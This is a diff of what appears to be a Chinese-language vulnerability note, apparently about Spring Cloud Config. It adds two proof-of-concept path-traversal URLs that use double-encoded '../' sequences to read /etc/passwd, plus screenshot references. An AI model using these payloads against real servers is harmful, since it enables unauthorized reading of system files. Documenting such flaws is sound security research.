@@ -105,11 +105,16 @@ spring.h2.console.settings.web-allow-others=true
 
 这里分享两个POC
 
+- /foo/default/master/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc/passwd
+- /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/master
 
 
-- /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/master
-- /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/master
 
 <img src="pictures/image-20200828162621094.png" alt="image-20200828162621094" style="zoom:67%;" />
 
+
+
 <img src="pictures/image-20200828162740251.png" alt="image-20200828162740251" style="zoom:67%;" />
+
+
+
